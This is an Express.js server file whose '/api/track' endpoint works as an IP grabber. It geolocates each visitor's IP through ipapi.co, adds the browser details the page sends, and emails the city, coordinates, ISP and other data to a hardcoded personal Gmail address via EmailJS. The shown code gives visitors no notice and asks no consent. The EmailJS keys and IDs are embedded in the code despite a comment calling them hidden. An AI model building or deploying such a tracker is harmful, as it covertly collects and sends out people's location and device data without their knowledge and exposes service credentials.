const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Your hidden secrets (environment variables in production)
const EMAILJS_PUBLIC_KEY = '2jj19BTFwlNnm8fp_';
const EMAILJS_SERVICE_ID = 'service_yn5chrh';
const EMAILJS_TEMPLATE_ID = 'template_psyarye';
const TARGET_EMAIL = 'surner282@gmail.com';

// API endpoint to track visitors
app.post('/api/track', async (req, res) => {
    try {
        // Get visitor's IP from request
        const visitorIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        
        // Get detailed IP info
        const ipResponse = await fetch(`https://ipapi.co/${visitorIP}/json/`);
        const ipData = await ipResponse.json();
        
        // Get additional data from frontend
        const { userAgent, screen, language, referrer } = req.body;
        
        // Prepare email data
        const emailData = {
            to_email: TARGET_EMAIL,
            subject: 'New IP Visitor',
            message: `
=== VISITOR TRACKED ===
IP: ${ipData.ip || visitorIP}
Location: ${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country_name || 'unknown'}
ISP: ${ipData.org || 'unknown'}
Country: ${ipData.country_code || 'unknown'}
Timezone: ${ipData.timezone || 'unknown'}
Coordinates: ${ipData.latitude || 'unknown'}, ${ipData.longitude || 'unknown'}
ASN: AS${ipData.asn || 'unknown'}

=== BROWSER INFO ===
User Agent: ${userAgent || 'unknown'}
Screen: ${screen || 'unknown'}
Language: ${language || 'unknown'}
Referrer: ${referrer || 'direct'}
Time: ${new Date().toLocaleString()}
            `
        };
        
        // Send email using EmailJS (server-side)
        const emailResponse = await fetch('https://api.emailjs.com/api/v1.0/email/send', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                service_id: EMAILJS_SERVICE_ID,
                template_id: EMAILJS_TEMPLATE_ID,
                user_id: EMAILJS_PUBLIC_KEY,
                template_params: emailData
            })
        });
        
        if (emailResponse.ok) {
            console.log('Email sent successfully');
        }
        
        // Return data to frontend
        res.json({
            success: true,
            data: {
                ip: ipData.ip || visitorIP,
                location: `${ipData.city || 'unknown'}, ${ipData.region || 'unknown'}, ${ipData.country_name || 'unknown'}`,
                isp: ipData.org || 'unknown',
                country: `${ipData.country_code || 'unknown'} (${ipData.country_calling_code || 'n/a'})`,
                timezone: ipData.timezone || 'unknown',
                coords: `${ipData.latitude || 'unknown'}, ${ipData.longitude || 'unknown'}`,
                asn: `AS${ipData.asn || 'unknown'} - ${ipData.network || 'unknown'}`
            }
        });
        
    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
